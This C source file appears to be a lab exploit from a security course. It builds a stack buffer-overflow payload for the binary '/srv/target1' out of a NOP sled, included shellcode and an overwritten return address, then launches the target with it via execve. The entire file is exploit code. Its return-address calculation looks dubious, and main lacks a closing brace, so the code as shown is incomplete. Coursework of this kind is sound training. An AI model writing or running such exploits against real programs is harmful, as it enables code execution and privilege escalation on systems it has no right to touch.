#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 12;
const int OFFSET_TO_RET = 8;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;

int main(int argc, char *argv[]) {

char *args[3];
char *env[1];

char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];
memset(buf, '\x90', sizeof(buf));
memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);

unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET;

*(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;

args[0] = TARGET;
args[1] = buf;
args[2] = NULL;
env[0] = NULL;

execve(TARGET, args, env);
fprintf(stderr, "execve failed.\n");

return 0;